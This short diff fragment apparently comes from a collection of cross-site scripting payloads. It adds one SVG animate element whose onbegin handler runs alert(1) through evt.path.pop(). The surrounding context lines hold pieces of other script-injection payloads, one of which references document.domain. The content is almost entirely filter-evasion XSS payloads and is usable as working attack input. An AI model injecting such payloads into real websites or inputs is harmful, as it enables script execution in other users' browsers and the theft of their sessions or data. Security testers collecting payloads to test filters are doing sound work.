@@ -27,3 +27,4 @@ ${document.domain}`%26it;/script>'>
    </script>
 </svg>
 
+<svg><animate onbegin=evt.path.pop().alert(1) attributeName=x dur=1s>
